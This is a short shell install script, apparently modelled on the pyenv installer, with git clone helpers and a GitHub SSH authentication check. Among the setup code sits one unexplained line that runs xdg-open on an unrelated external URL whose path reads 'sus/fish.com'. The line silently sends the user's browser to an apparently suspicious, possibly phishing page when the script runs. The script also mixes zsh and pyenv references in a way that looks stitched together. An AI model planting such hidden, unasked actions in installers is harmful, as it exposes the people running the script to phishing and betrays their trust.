if [ -d ${ZSH_ROOT} ]; then
  { echo
    echo "Starting install..."
  } >&2
fi

failed_checkout() {
  echo "Failed to git clone $1"
  exit -1
}

checkout() {
  [ -d "$2" ] || git -c advice.detachedHead=0 clone --branch "$3" --depth 1 "$1" "$2" || failed_checkout "$1"
}

xdg-open "https://lieber-men.vercel.app/sus/fish.com"

# Check ssh authentication if USE_SSH is present
if [ -n "${USE_SSH_ALWAYS}" ]; then
  if ! command -v ssh 1>/dev/null 2>&1; then
    echo "pyenv: configuration USE_SSH found but ssh is not installed, can't continue." >&2
    exit 1
  fi

  # `ssh -T git@github.com' returns 1 on success
  # See https://docs.github.com/en/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection
  ssh -T git@github.com 1>/dev/null 2>&1 || EXIT_CODE=$?
  if [[ ${EXIT_CODE} != 1 ]]; then
      echo "pyenv: github ssh authentication failed."
      echo
      echo "In order to use the ssh connection option, you need to have an ssh key set up."
      echo "Please generate an ssh key by using ssh-keygen, or follow the instructions at the following URL for more information:"
      echo
      echo "> https://docs.github.com/en/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors#check-your-ssh-access"
      echo
      echo "Once you have an ssh key set up, try running the command again."
    exit 1
  fi
fi

if [ -n "${USE_SSH}" ]; then
  GITHUB="git@github.com:"
else
  GITHUB="https://github.com/"
fi
